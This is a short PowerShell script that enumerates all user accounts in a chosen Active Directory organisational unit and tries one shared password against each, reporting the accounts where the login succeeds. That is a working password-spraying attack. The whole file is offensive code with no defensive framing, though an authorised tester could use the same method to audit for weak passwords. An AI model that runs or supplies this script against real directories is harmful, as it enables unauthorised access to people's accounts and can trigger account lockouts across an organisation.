Import-Module ActiveDirectory

Function Test-ADAuthentication {
    param($username,$password)
    (new-object directoryservices.directoryentry "",$username,$password).psbase.name -ne $null
}

$PasswordToGuess=""

$SearchBase = ""

# Get user input
$DomainName = Read-Host "Enter the domain name"
$OU = Read-Host "Enter the organization unit"

# Split the string by .
$DomainParts = $DomainName.split(".")

# Create the LDAP search string
$SearchBase = "OU=" + $OU + ","
ForEach($Part in $DomainParts) {
  $SearchBase = $SearchBase + "DC=" + $Part + ","
}

# Remove the last character (the extra comma)
$SearchBase = $SearchBase.Substring(0,$SearchBase.Length-1)

Write-Host "Searching: " $SearchBase

# Return a list of usernames
$Usernames = Get-ADUser -Filter * -SearchBase $SearchBase | Select -Exp SamAccountname

ForEach ($Username in $Usernames)
{
  $guessed = Test-ADAuthentication $Username $PasswordToGuess
  If($guessed -Eq "True")
  {
    Write-Host $Username ": " $guessed
  }
}
